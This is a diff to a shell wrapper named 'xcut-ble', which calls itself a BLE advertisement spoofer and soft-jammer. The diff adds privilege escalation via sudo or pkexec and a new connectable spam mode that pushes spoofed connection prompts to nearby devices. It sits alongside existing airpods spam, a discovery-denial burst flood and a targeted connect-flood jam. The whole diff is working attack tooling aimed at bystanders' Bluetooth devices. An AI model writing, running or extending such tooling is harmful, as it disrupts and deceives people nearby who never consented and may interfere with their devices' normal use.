@@ -19,6 +19,21 @@ if [ -z "$RAW" ]; then
 fi
 JAMPID="/tmp/xcut-jam.pid"
 
+# The kernel MGMT channel only lets CAP_NET_ADMIN (root) sockets add
+# advertising / read adv features; non-root gets PERMISSION_DENIED (and on
+# some kernels an opaque ENOMEM). Re-exec elevated like the main "xcut".
+require_root() {
+    [ "$(id -u)" -eq 0 ] && return 0
+    if command -v sudo >/dev/null 2>&1; then
+        exec sudo "$0" "$@"
+    fi
+    if command -v pkexec >/dev/null 2>&1; then
+        exec pkexec "$0" "$@"
+    fi
+    echo "xcut-ble: butuh root (sudo/pkexec) untuk akses MGMT channel" >&2
+    exit 1
+}
+
 usage() {
     cat <<'EOF'
 xcut-ble: BLE advertisement spoofer / soft-jammer (mgmt channel; no bluetoothd stop needed)
@@ -26,6 +41,8 @@ xcut-ble: BLE advertisement spoofer / soft-jammer (mgmt channel; no bluetoothd s
   off              remove all advertising instances
   check            show adapter + instances via btmgmt
   scan [sec]       scan nearby BLE devices
+  conn [mode]      CONNECTABLE (ADV_IND) adv spam: nearby devices get
+                   connection-request prompts toward your spoofed payload
   burst [mode]     adv-churn flood (discovery denial, global effect)
   jam [BLE-MAC]    burst + optional connect-flood to jam a specific device
   jam stop         stop jam, clear everything
@@ -35,6 +52,7 @@ EOF
 
 stop_jam() {
     pkill -9 -f "xcut-ble-raw burst" 2>/dev/null
+    pkill -9 -f "xcut-ble-raw conn" 2>/dev/null
     pkill -9 -f "bluetoothctl connect" 2>/dev/null
     pkill -9 -f "bluetoothctl disconnect" 2>/dev/null
     if [ -e "$JAMPID" ]; then
@@ -46,16 +64,26 @@ stop_jam() {
 
 case "${1:-}" in
     on)
+        require_root "$@"
         echo "BLE spam: ${2:-airpods}"
         trap 'true' INT TERM HUP
         python3 "$RAW" on "${2:-airpods}" "${3:-}"
         ;;
     burst)
+        require_root "$@"
         echo "BLE burst flood (soft-jam). Ctrl-C utk berhenti"
-        python3 "$RAW" burst "$2" "$3"
+        python3 "$RAW" burst "${2:-}" "${3:-}"
         echo "burst berhenti - untuk jaga-jaga xcut ble jam stop"
         ;;
+    conn)
+        require_root "$@"
+        echo "BLE connectable spam (request-conn): ${2:-all}. Ctrl-C utk berhenti"
+        trap 'true' INT TERM HUP
+        python3 "$RAW" conn "${2:-all}" "${3:-}"
+        echo "conn berhenti - untuk jaga-jaga xcut ble off"
+        ;;
     jam)
+        require_root "$@"
         if [ "${2:-}" = "stop" ]; then
             stop_jam
             exit 0
@@ -83,9 +111,11 @@ case "${1:-}" in
         echo "jam berhenti, instance dibersihkan"
         ;;
     off)
+        require_root "$@"
         python3 "$RAW" off
         ;;
     check)
+        require_root "$@"
         python3 "$RAW" check
         btmgmt -i 0 advinfo 2>&1 || true
         ;;
